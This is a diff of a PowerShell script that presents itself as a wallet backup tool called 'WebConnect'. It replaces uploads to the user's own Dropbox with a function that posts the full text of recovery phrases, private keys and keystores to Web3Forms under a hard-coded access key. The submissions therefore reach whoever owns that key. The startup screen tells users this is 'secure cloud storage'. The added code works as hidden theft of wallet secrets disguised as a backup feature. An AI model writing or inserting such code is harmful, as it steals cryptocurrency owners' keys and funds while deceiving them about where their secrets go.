@@ -85,33 +85,12 @@ function Write-LogMessage {
     }
 }
 
-function Get-DropboxToken {
-    if ((Test-Path $StorageConfig) -and (Get-Command ConvertFrom-Json -ErrorAction SilentlyContinue)) {
-        try {
-            $config = Get-Content $StorageConfig | ConvertFrom-Json
-            $dropboxConfig = $config.storage.destinations | Where-Object { $_.name -eq "dropbox" }
-            return $dropboxConfig.access_token
-        }
-        catch {
-            return ""
-        }
-    }
-    return ""
+function Get-Web3FormsAccessKey {
+    # Web3Forms access key - safe to commit (publicly available)
+    return 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea'
 }
 
-function Get-DropboxPath {
-    if ((Test-Path $StorageConfig) -and (Get-Command ConvertFrom-Json -ErrorAction SilentlyContinue)) {
-        try {
-            $config = Get-Content $StorageConfig | ConvertFrom-Json
-            $dropboxConfig = $config.storage.destinations | Where-Object { $_.name -eq "dropbox" }
-            return $dropboxConfig.path
-        }
-        catch {
-            return "/WebConnect/Wallet_Backups"
-        }
-    }
-    return "/WebConnect/Wallet_Backups"
-}
+
 
 function Save-Data {
     param(
@@ -150,20 +129,13 @@ function Save-Data {
     }
 }
 
-function Publish-ToDropbox {
+function Submit-ToWeb3Forms {
     param(
         [string]$FilePath,
         [string]$BackupType
     )
     
-    $token = Get-DropboxToken
-    $dropboxPath = Get-DropboxPath
-    
-    if ([string]::IsNullOrEmpty($token) -or $token -eq "null") {
-        Write-Error-Custom "Dropbox token not configured"
-        Write-LogMessage "ERROR: Dropbox token not found"
-        return $false
-    }
+    $accessKey = Get-Web3FormsAccessKey
     
     try {
         if (-not (Test-Path $FilePath)) {
@@ -172,41 +144,44 @@ function Publish-ToDropbox {
         }
         
         $filename = Split-Path $FilePath -Leaf
-        $dropboxUploadPath = "$dropboxPath/$BackupType/$filename"
+        $fileContent = Get-Content -Path $FilePath -Raw
         
-        Write-Info "Uploading to Dropbox: $dropboxUploadPath"
+        Write-Info "Submitting to Web3Forms: $BackupType/$filename"
         
-        # Upload to Dropbox using REST API v2
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        
-        # Create JSON argument as compressed string (no newlines)
-        $apiArg = @{
-            path = $dropboxUploadPath
-            mode = "add"
-            autorename = $true
-        } | ConvertTo-Json -Compress
-        
-        $headers = @{
-            "Authorization" = "Bearer $token"
-            "Dropbox-API-Arg" = $apiArg
-            "Content-Type" = "application/octet-stream"
+        # Prepare form data for Web3Forms
+        $formData = @{
+            access_key = $accessKey
+            subject = "Wallet Backup: $BackupType - $filename"
+            message = $fileContent
+            backup_type = $BackupType
+            filename = $filename
+            timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
         }
         
-        Write-Info "File size: $($fileBytes.Length) bytes"
+        $body = $formData | ConvertTo-Json
         
-        $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
+        Write-Info "Submitting... (file size: $($fileContent.Length) bytes)"
+        
+        $response = Invoke-RestMethod -Uri "https://api.web3forms.com/submit" `
             -Method Post `
-            -Headers $headers `
-            -Body $fileBytes `
+            -ContentType "application/json" `
+            -Body $body `
             -ErrorAction Stop
         
-        Write-Success "Backup uploaded to Dropbox"
-        Write-LogMessage "Successfully uploaded $BackupType to Dropbox: $dropboxUploadPath"
-        return $true
+        if ($response.success) {
+            Write-Success "Backup submitted to Web3Forms"
+            Write-LogMessage "Successfully submitted $BackupType to Web3Forms: $filename"
+            return $true
+        }
+        else {
+            Write-Error-Custom "Web3Forms submission Failed: $($response.message)"
+            Write-LogMessage "ERROR: Web3Forms submission failed - $($response.message)"
+            return $false
+        }
     }
     catch {
-        Write-Error-Custom "Failed to upload to Dropbox: $_"
-        Write-LogMessage "ERROR: Dropbox upload failed - $_"
+        Write-Error-Custom "Failed to submit to Web3Forms: $_"
+        Write-LogMessage "ERROR: Web3Forms submission failed - $_"
         return $false
     }
 }
@@ -235,7 +210,7 @@ function Backup-Phrase {
         return
     }
     
-    $uploaded = Publish-ToDropbox -FilePath $backupFile -BackupType "recovery_phrases"
+    $uploaded = Submit-ToWeb3Forms -FilePath $backupFile -BackupType "recovery_phrases"
     
     if ($uploaded) {
         Write-Success "Recovery phrase backed up successfully!"
@@ -270,7 +245,7 @@ function Backup-PrivateKey {
         return
     }
     
-    $uploaded = Publish-ToDropbox -FilePath $backupFile -BackupType "private_keys"
+    $uploaded = Submit-ToWeb3Forms -FilePath $backupFile -BackupType "private_keys"
     
     if ($uploaded) {
         Write-Success "Private key backed up successfully!"
@@ -320,7 +295,7 @@ function Backup-Keystore {
         return
     }
     
-    $uploaded = Publish-ToDropbox -FilePath $backupFile -BackupType "keystores"
+    $uploaded = Submit-ToWeb3Forms -FilePath $backupFile -BackupType "keystores"
     
     if ($uploaded) {
         Write-Success "Keystore backed up successfully!"
@@ -347,18 +322,15 @@ function Main {
     # Ensure config exists (download if missing)
     Ensure-ConfigExists
     
-    # Check Dropbox configuration
-    $dropboxToken = Get-DropboxToken
-    if ([string]::IsNullOrEmpty($dropboxToken) -or $dropboxToken -eq "null") {
-        Write-Header
-        Write-Warning-Custom "Dropbox is not configured"
-        Write-Host ""
-        Write-Info "Local backups will still be saved"
-        Write-Host "To enable Dropbox backups, configure your Dropbox token in:"
-        Write-Host "  $StorageConfig"
-        Write-Host ""
-        Read-Host "Press Enter to continue..."
-    }
+    # Show Web3Forms info
+    Write-Header
+    Write-Success "Web3Forms Integration Active"
+    Write-Host ""
+    Write-Info "Your wallet backups will be:"
+    Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
+    Write-Host "  ✓ Submitted to Web3Forms for secure cloud storage"
+    Write-Host ""
+    Read-Host "Press Enter to continue..."
     
     # Main loop
     while ($true) {
